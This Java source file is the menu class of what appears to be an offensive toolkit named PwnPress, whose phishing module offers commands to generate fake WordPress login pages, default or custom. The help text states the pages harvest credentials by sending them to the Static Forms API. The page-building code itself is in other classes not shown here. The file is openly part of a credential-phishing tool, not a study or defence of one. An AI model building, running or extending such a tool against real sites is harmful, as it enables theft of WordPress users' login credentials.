package org.pwnpress.phisher;

import java.io.IOException;
import java.util.Scanner;

import org.pwnpress.framework.WPFramework;
import org.pwnpress.framework.WPFrameworkSettings;

public class WPPhisher {

    public static void phish() throws IOException {
        Scanner scanner = new Scanner(System.in);
        // printHelp();

        /*
        String url = null;
        if (WPFrameworkSettings.getConstantUrl() != null) {
            url = WPFrameworkSettings.getConstantUrl();
        }
        */

        while (true) {
            System.out.print("\nPwnPress (phish) > ");

            if (!scanner.hasNextLine()) {
                System.out.println("\nNo input found. Exiting.");
                break;
            }

            String command = scanner.nextLine();

            if (command.equalsIgnoreCase("exit")) {
                System.out.println("\nExiting PwnPress Framework. Goodbye and Happy Hacking!");
                scanner.close();
                System.exit(0);
            } else if (command.equalsIgnoreCase("back")) {
                WPFramework.framework();
            } else if (command.toLowerCase().startsWith("default")) {
                WPDefaultLogin.phish();
            } else if (command.toLowerCase().startsWith("custom")) {
                WPCustomLogin.phish();
            } else if (command.toLowerCase().startsWith("settings")) {
                WPFrameworkSettings.settings();
            } else if (command.equalsIgnoreCase("help")) {
                printHelp();
            } else {
                System.out.println("\nUnknown command. Type 'help' for available commands.");
            }
        }

        // scanner.close();
    }

    private static void printHelp() {
        System.out.println("\nAvailable commands:\n");
        System.out.print("At the moment the phishing page uses Static Forms API to collect credentials."
                + "\nVisit https://www.staticforms.xyz/ for more info.\n\n");

        System.out.println("  default              - Generate a phishing page for the default WordPress login page.");
        System.out.println("  custom               - Generate a phishing page for a custom WordPress login page.");
        System.out.println();
        System.out.println("  back");
        System.out.println("  exit");

    }
}
